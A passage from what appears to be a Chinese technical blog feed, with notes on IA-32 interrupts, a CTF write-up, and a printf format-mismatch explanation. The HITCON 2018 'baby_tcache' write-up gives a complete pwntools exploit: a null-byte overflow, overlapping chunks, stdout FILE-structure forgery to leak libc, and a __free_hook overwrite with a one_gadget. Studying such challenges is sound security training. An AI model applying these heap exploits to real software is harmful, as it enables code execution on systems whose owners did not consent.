exceptions.</p><p>异常通常是CPU在执行指令时因为检测到预先定义的某个或多个条件而产生的同步事件,又被叫做同步中断，来自处理器内部，IF位在这里不起任何作用，立即执行</p><ul><li><p>故障(Fault)</p><blockquote><p>可能被异常处理程序修复，如果修复，再返回到当前引起异常的指令，比如说我们的缺页异常，指令引用一个虚拟地址，发现他对应的的物理页面不在内存，异常处理程序会把它从磁盘取出来放到内存，加载后再回到该指令就可以正常执行，修复不了，终止</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422202900753.png" alt="image-20230422202900753"></p></blockquote></li><li><p>陷阱(Traps)</p><blockquote><p>有意的异常，执行完陷阱指令后，报告给cpu异常，比如我们的int n(有的书里把这个叫做软中断)，int3, into(溢出检测)，bound(地址越界检测),ud2(未定义指令)等，最重要的作用就是提供用户和内核的接口–系统调用，异常处理程序的返回地址指向导致异常指令的下一个指令地址</p></blockquote></li><li><p>终止(Aborts)</p><blockquote><p>直接终止，处理程序将控制返回给一个abort例程，该例程会终止这个应用程序</p></blockquote></li></ul><h2 id="中断向量表（Interrupt-Vector-Table，IVT）"><a href="#中断向量表（Interrupt-Vector-Table，IVT）" class="headerlink" title="中断向量表（Interrupt Vector Table，IVT）"></a>中断向量表（Interrupt Vector Table，IVT）</h2><p>实模式下用于存储中断处理程序入口的表</p><p>系统开机后处于实模式，1M的寻址空间，由BOIS做检测和初始化，初始化就包括了在00000H~003ffh 1kb区域建立中断向量表，表里的每一项记录中断或异常处理程序的入口地址，叫做中断向量，占4个字节，所以共有256个，BIOS再利用INT执行特定中断处理程序把引导程序从磁盘加载到内存，引导后，进入保护模式</p><h2 id="中断描述符表（Interrupt-Descriptor-Table，IDT）"><a href="#中断描述符表（Interrupt-Descriptor-Table，IDT）" class="headerlink" title="中断描述符表（Interrupt Descriptor Table，IDT）"></a>中断描述符表（Interrupt Descriptor Table，IDT）</h2><p>保护模式下用于存储中断处理程序入口的表</p><p>IDTR寄存器来描述的IDT的位置和长度lidt指令可以往idtr里装入数据，和GDTR一样前32位是idt地址，16位表长度描述表的大小，为0时大小是1</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422230738609.png" alt="image-20230422230738609"></p><p>IDT的每个表项是一个8字节的门描述符（Gate Descriptor）结构</p><p>我们之前的段描述符中描述的是一片内存区域，而门描述符中描述的是一段代码</p><p>还记得我们之前段描述符的S&#x3D;0代表该描述符描述的是一个系统段，S&#x3D;1代表该描述符描述的是代码段、数据段或堆栈段，TYPE和S段配合使用，段的访问权限或系统控制描述类型</p><p>这里的门就是系统段S&#x3D;0，根据TYPE不同分为不同门</p><p>任务门描述符 0101 用于任务切换</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232250447.png" alt="image-20230422232250447"></p><p>中断门描述符 D110 用于描述中断处理例程的入口  IF位自动置 0</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232346158.png" alt="image-20230422232346158"></p><p>陷阱门描述符 D111 用于描述异常处理例程的入口 IF位不会自动置0</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232525942.png" alt="image-20230422232525942"></p><p>D位用来表示描述的是16位门（0）还是32位门（1），同样DPL表示访问本段的最低权限要求</p><h2 id="异常和中断处理过程"><a href="#异常和中断处理过程" class="headerlink" title="异常和中断处理过程"></a>异常和中断处理过程</h2><p>CPU收到中断向量号后，把IDTR里IDT基地址+中断向量号*8得到中断门描述符</p><p>如果是使用INT3 int n INTO等指令产生的中断或异常，会检测CPL和门描述符里的DPL，CPL权限必须大于等于DPL，</p><p>然后再次检测CPL权限必须小于门描述符里选择子对于代码段的DPL，也就是特权转移处理除了返回，只能从低权限转到高权限</p><p>如果是由硬件产生的中断或处理器检测到的异常，不会进行第一次和门描述符DPL的检测，只和代码段检测</p><p>把选择子加载到cs 偏移加载到eip执行</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423013430409.png" alt="image-20230423013430409"></p><h2 id="中断发生时的压栈"><a href="#中断发生时的压栈" class="headerlink" title="中断发生时的压栈"></a>中断发生时的压栈</h2><p>拿到中断描述符后CPL和描述符里的选择子对应当的DPL比较</p><p>&gt;&gt;&gt;CPL权限低于DPL的话需要切换到高特权级的栈，为了执行完中断后恢复，会先临时保存当前栈的ss和esp，从TSS段里拿到DPL级别的栈加载到ss和esp，然后把临时保存的旧ss：esp压入新栈，然后压入eflags寄存器，cs，eip,有的中断还会压入出错码</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423020740539.png" alt="image-20230423020740539"></p><p>&gt;&gt;&gt;CPL&#x3D;DPL是不用切换堆栈，故不用压入原ss esp，其余一样</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423021021604.png" alt="image-20230423021021604"></p><p>然后选择子加载到cs 偏移加载到ei，执行中断处理程序，中断执行完用iret指令返回被中断程序，iret会把eip cs eflags弹出到寄存器，iret执行时esp必须指向eip，所以我们必须自己弹出出错码</p><p>iret同样会进行权限检测，进行逆过程决定是不是弹出就ss:esp</p><h2 id="IA32中断向量号"><a href="#IA32中断向量号" class="headerlink" title="IA32中断向量号"></a>IA32中断向量号</h2><p>0-255</p><p>其中0-31被cpu设计者占用，32-255供操作系统等使用</p><table><thead><tr><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>32-255</td><td>用户定义中断</td><td>中断</td><td>可屏蔽中断</td><td>来自INTR的外部中断或INT n指令</td><td></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2018 HITCON PWN baby_tcache</title>
      <link href="/2023/04/19/HITCON-2018-PWN-baby-tcache/"/>
      <url>/2023/04/19/HITCON-2018-PWN-baby-tcache/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1LiWzcGrrdDOI3gH6EXhQzA">https://pan.baidu.com/s/1LiWzcGrrdDOI3gH6EXhQzA</a><br>提取码：79ui</p><p>libc2.27</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/c/p/heap&gt; checksec baby_tcache</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/heap/baby_tcache&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>只有add和delete功能，最多10个chunk，漏洞也很容易找到</p><p>new里的<code> v3[size] = 0;</code>null byte one漏洞</p><p>很容易可以利用去构成overlapping chunk 去做freehook就行了，但是程序没有输出，怎么泄露libc呢</p><p>输出函数只有printf和puts，printf在IOFILE里分析过了看下puts把</p><p><code>libio/ioputs.c</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>熟悉的_IO_sputn调用，fwrite的主要函数，最终会输出<code>_IO_2_1_stdout_</code>中_IO_write_base~IO_write_ptr之间的内容，虽然程序用setvbuf关了缓冲区，但是setvbuf是打开_IO_2_1_stdout_的flag低两个bit来关闭缓冲区的，如果我们可以控制底层的flag，还怕这个?</p><p>思路把_IO_2_1_stdout_链入bin伪造一波，获取libc，利用overlapping做freehook</p><h3 id="overlapping-chunk"><a href="#overlapping-chunk" class="headerlink" title="overlapping chunk"></a>overlapping chunk</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x500</span> - <span class="number">0x8</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment"># 6 //防止0和5合并时，和topchunk合并</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\x60\x06&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>申请了6个堆</p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419233901431.png" alt="image-20230419233901431" style="zoom:80%;"><p>想让堆5做先前合并到0，就需要修改堆5的prevsize和previnuse位，</p><p>释放堆5时要制造前面所有堆块是一个大堆块且free状态的假象，prevsize&#x3D;0x500+0x40+0x50+0x60+0x70&#x3D;0x660</p><p>释放4再申请0x68拿回来原来的chunk，由于空间复用和null byte overflow 可以修改堆5的prevsize和previnuse位</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234348442.png" alt="image-20230419234348442"></p><p>释放0再释放5构成unlink，导致overlapping</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234533161.png" alt="image-20230419234533161"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234624496.png" alt="image-20230419234624496"></p><p>大小为0x660+0x500&#x3D;0xB60符合预期</p><p>同时把堆2放入bin里为下一步做准备</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234602649.png" alt="image-20230419234602649"></p><h3 id="IO-2-1-stdout入链"><a href="#IO-2-1-stdout入链" class="headerlink" title="IO_2_1_stdout入链"></a>IO_2_1_stdout入链</h3><p>我们可以切割unsortedbin来让在tcachebin的堆2的fd指向unsortedbin，</p><p>切割大小为0x500+0x40，减去chunkhead为0x530大小</p><p>add(0x530)</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235740115.png" alt="image-20230419235740115"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235803167.png" alt="image-20230419235803167"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000100153.png" alt="image-20230420000100153"></p><p>申请出来尾号1790的chunk，把他的fd低两个字节改掉就可以入链</p><p><code>add(0xa0, b&#39;\x60\xc7&#39;)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000346155.png" alt="image-20230420000346155"></p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>拿出来stdout进行伪造</p><p>flag需要满足</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br></pre></td></tr></table></figure><p>即flag&#x3D;0xFBAD1800</p><p><code>add(0x40)</code></p><p><code>add(0x3f,p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39;)</code></p><p>为什么会是3f这么奇怪的数字而不是直接0x40大小，应为我们程序会v3[size] &#x3D; 0;会在申请到的堆0x7ffff7bec760+size位置零，在stdout的IO_FILE结构体里随便置零极有可能导致程序crash掉</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003158991.png" alt="image-20230420003158991"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003516321.png" alt="image-20230420003516321"></p><p>所以我们选择了一块本来就是零的地方，0x3e 0x3f 0x47 0x48都可以</p><p>修改前</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420001600223.png" alt="image-20230420001600223"></p><p>修改后</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003955229.png" alt="image-20230420003955229"></p><p>下次输出菜单时即可泄露地址</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004449167.png" alt="image-20230420004449167"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004531732.png" alt="image-20230420004531732"></p><h3 id="freehook"><a href="#freehook" class="headerlink" title="freehook"></a>freehook</h3><p>这个时候我们看下unsortbin</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420005729367.png" alt="image-20230420005729367"></p><p>哟，这不是我们的堆4吗，如果我们在前面</p><p><code>add(0x40)</code></p><p><code>add(0x3f,p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39;)</code>的时候释放掉chunk4时，不就可以把chunk4放入tcache吗</p><p><code>delete(4) add(0x530) add(0xa0, b&#39;\x60\xc7&#39;)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010052891.png" alt="image-20230420010052891"></p><p>两次申请freehook里写入onegadget即可</p><p><code>add(0x60,p64(libcelf.symbols[&#39;__free_hook&#39;]))</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010633032.png" alt="image-20230420010633032"></p><p><code>add(0x60) add(0x60,p64(onegadget))</code></p><p><code>delete(0)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010811418.png" alt="image-20230420010811418"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./baby_tcache&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=ELF(<span class="string">&#x27;/mnt/hgfs/Share/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">b&#x27;x&#x27;</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Data:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment"># 0</span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x500</span> - <span class="number">0x8</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment"># 6 </span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\x60\x06&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">0xa0</span>, <span class="string">b&#x27;\x60\xc7&#x27;</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment"># db(&#x27;b malloc&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0D83)&#x27;)</span></span><br><span class="line">add(<span class="number">0x48</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">66</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">libc=uu64(r(<span class="number">6</span>))-<span class="number">0x3ed8b0</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">libcelf.address=libc</span><br><span class="line">onegadget=libc+<span class="number">0x4f302</span></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0xa0</span>,p64(libcelf.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache </tag>
            
            <tag> IO FILE </tag>
            
            <tag> Null Byte Overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>An interview question from baidu</title>
      <link href="/2023/04/17/An-interview-question-from-baidu/"/>
      <url>/2023/04/17/An-interview-question-from-baidu/</url>
      
        <content type="html"><![CDATA[<h2 id="流传的一道百度面试题"><a href="#流传的一道百度面试题" class="headerlink" title="流传的一道百度面试题"></a>流传的一道百度面试题</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">double</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/NEMU [1]&gt; gcc -m32 -g -o  test test.c</span><br><span class="line">test.c: In function ‘main’:</span><br><span class="line">test.c:4:18: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘double’ [-Wformat=]</span><br><span class="line">    4 |     printf(&quot;a = %d\n&quot;, a);</span><br><span class="line">      |                 ~^     ~</span><br><span class="line">      |                  |     |</span><br><span class="line">      |                  int   double</span><br><span class="line">      |                 %f</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = 0    </span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; gcc  -g -o  test test.c</span><br><span class="line">test.c: In function ‘main’:</span><br><span class="line">test.c:4:18: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘double’ [-Wformat=]</span><br><span class="line">    4 |     printf(&quot;a = %d\n&quot;, a);</span><br><span class="line">      |                 ~^     ~</span><br><span class="line">      |                  |     |</span><br><span class="line">      |                  int   double</span><br><span class="line">      |                 %f</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = 1853816616</span><br><span class="line">grxer@grxer ~/D/s/NEMU&gt; ./test</span><br><span class="line">a = -600037016</span><br></pre></td></tr></table></figure><p>IA-32上运行时, 打印结果为<code>a=0</code>; 在x86-64上运行时, 打印出来的<code>a</code>是一个不确定值</p><h2 id="WHY"><a href="#WHY" class="headerlink" title="WHY?"></a>WHY?</h2><h3 id="IEEE-754"><a href="#IEEE-754" class="headerlink" title="IEEE 754"></a>IEEE 754</h3><p>先复习一些IEEE 754浮点数</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230420111646829.png" alt="image-20230420111646829"></p><p>单精度 1位符号位(sign) 8位阶码(exponent) 23位有效数(significand)</p><p>双精度 1 11 52</p><ul><li><p>规格化的值</p><ul><li><p>exp阶码位域既不是全0也不是全1</p></li><li><p>阶码字段是有偏置的有符号整数 E&#x3D;e-Bias  ps:这种偏置给浮点数的比较带来了巨大方便</p><ul><li>e是exp表示的无符号数</li><li>Bias是偏置值&#x3D;2<sup>k-1</sup>-1 单精度为2<sup>8-1</sup>-1&#x3D;127 双精度为2<sup>11-1</sup>-1&#x3D;1023</li><li>所以单精度指数范围为 1-127~254-127即-126<del>+127 双精度为-1022</del>+1023</li></ul></li><li><p>significand位总是1.开头，也就是有效数大于等于1且小于2，所以不记录1,只记录小数点后面的值</p></li><li><p>值Value&#x3D;(—1)<sup>s</sup>2<sup>exp-Bias</sup>*(frac+1)</p></li></ul></li><li><p>非规格化的值</p><ul><li>exp阶码位域全为0</li><li>阶码值E&#x3D;1-Bias<ul><li>32位-126，64位-1022</li></ul></li><li>有效数0.开头，也就是有效数小于1且大于等于0</li><li>非规格化浮点值的绝对值小于所有的规格化浮点数的绝对值</li><li>有效数全为0时，符号位决定了+0,-0的表示</li><li>非规格化浮点填补绝对值意义下最小规格数与零的距离(太小的浮点数规格化的exp位不够用)，最大的非规格数等于最小的规格数</li></ul></li><li><p>特殊值</p><ul><li>exp阶码全为1<ul><li>有效数全为0时，表示无穷inf(infinity) 符号位决定+inf，-inf 非0浮点数和整数不一样，他是可以除以0的，得到inf</li><li>有效数<strong>不全为0</strong>，表示Nan(not a number)，有时候利用Nan和其他任何数比较返回false的特性可能造成一些支付逻辑上的漏洞</li></ul></li></ul></li></ul><h3 id="在线转换"><a href="#在线转换" class="headerlink" title="在线转换"></a>在线转换</h3><p><a href="https://www.toolhelper.cn/Digit/FractionConvert">https://www.toolhelper.cn/Digit/FractionConvert</a></p><p><a href="https://www.h-schmidt.net/FloatConverter/IEEE754.html">https://www.h-schmidt.net/FloatConverter/IEEE754.html</a></p><h3 id="IA-32"><a href="#IA-32" class="headerlink" title="IA-32"></a>IA-32</h3><p>对于ia32的结果我们并不感到奇怪，</p><p>double的10.00先手动转一下吧，写为二进制1010.00，然后需要左移三位才能1.0开头，即1.010*2<sup>3</sup>,所以S&#x3D;0，E&#x3D;1023+3&#x3D;100 0000 0010b significand&#x3D;010，组合起来就可以了</p><p><code>0 10000000010 0100000000000000000000000000000000000000000000000000</code>   hex&#x3D;0x4024000000000000</p><p>32位参数都是在栈上(除非你用fastcall的调用约定，C&#x2F;C++默认的函数调用协议的_cdecl)，我们的浮点数有专门的处理单元，寄存器，和指令集</p><p>IA-32采用了x87 FPU的指令集来处理浮点数</p><blockquote><p>FPU有8个独立的可寻址的80位数据寄存器R0~R7，这组寄存器叫做寄存器栈，FPU状态字中名为TOP的3位字段给出了当前栈顶的寄存器编号，入栈top-1，出栈+1，7如果再出栈top会回到R0，如果覆盖掉原有数据会产生浮点数异常</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418232538589.png" alt="image-20230418232538589"></p><p>st0总是表示栈顶，即top所指即st0</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230419133610761.png" alt="image-20230419133610761"></p><p>浮点数在进栈会拓展到80位，出栈时从80位进行转换</p><p>为什么会用栈呢，学过数据结构的可能已经猜到了，这里是用后缀表达式通过栈来来进行的运算</p></blockquote><p>但是他还是把参数压栈了</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230420110749224.png" alt="image-20230420110749224"></p><p>典型_cdecl特征 参数右向左入栈，外平栈(调用者平栈)，还分了两次把8自己字节的double压栈，其实我们在骗他玩，哈哈</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418113446986.png" alt="image-20230418113446986"></p><p>此时的栈按四字节int输出0没问题</p><h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h3><p>顺便说一下为什么不叫IA-64架构，害，因为IA-64的名字被安腾架构占去</p><p>64位采用寄存器传参，x64用了SSE指令集，这里要细说起来内容挺多的，推出的主要原因是为了提高3d游戏性能</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418140620437.png" alt="image-20230418140620437"></p><p>直接把浮点数放到了xmm0寄存器，如果取的话也直接去这里取(rip的相对寻址rip是执行这条指令过后的rip)</p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418140809555.png" alt="image-20230418140809555" style="zoom:80%;"><p>我们%d会在常规的rsi低四字节做参数</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418141359969.png" alt="image-20230418141359969"></p><p>FFFFDF48四个字节，这次就输出-8,376</p><p><img src="/2023/04/17/An-interview-question-from-baidu/image-20230418141756625.png" alt="image-20230418141756625"></p><p>所以这就可以有些很有意思但可能在初学c语言的人看来很奇怪的事情，比如下面两个传参都打印出正确结果</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">12</span>;</span><br><span class="line">    <span class="type">double</span> y = <span class="number">6.666</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%f\n&quot;</span>, x, y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d,%f&quot;</span>, y, x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/NEMU&gt; gcc -g -o  test test.c</span><br><span class="line">test.c: In function ‘main’:</span><br><span class="line">test.c:8:14: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘double’ [-Wformat=]</span><br><span class="line">    8 |     printf(&quot;%d,%f&quot;, y, x);</span><br><span class="line">      |             ~^      ~</span><br><span class="line">      |              |      |</span><br><span class="line">      |              int    double</span><br><span class="line">      |             %f</span><br><span class="line">test.c:8:17: warning: format ‘%f’ expects argument of type ‘double’, but argument 3 has type ‘int’ [-Wformat=]</span><br><span class="line">    8 |     printf(&quot;%d,%f&quot;, y, x);</span><br><span class="line">      |                ~^      ~</span><br><span class="line">      |                 |      |</span><br><span class="line">      |                 double 